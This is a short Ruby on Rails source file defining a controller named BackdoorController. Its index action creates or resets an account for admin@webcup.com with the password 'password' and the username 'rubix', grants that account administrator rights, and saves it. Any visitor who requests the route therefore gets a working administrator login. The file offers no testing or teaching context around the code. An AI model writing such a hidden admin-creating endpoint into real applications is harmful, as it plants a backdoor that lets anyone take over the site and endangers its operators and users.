class BackdoorController < ApplicationController
  def index
    user = User.where(email: 'admin@webcup.com').first_or_initialize
    user.password = 'password'
    user.password_confirmation = 'password'
    user.username = 'rubix'
    user.admin = true

    user.save
  end
end
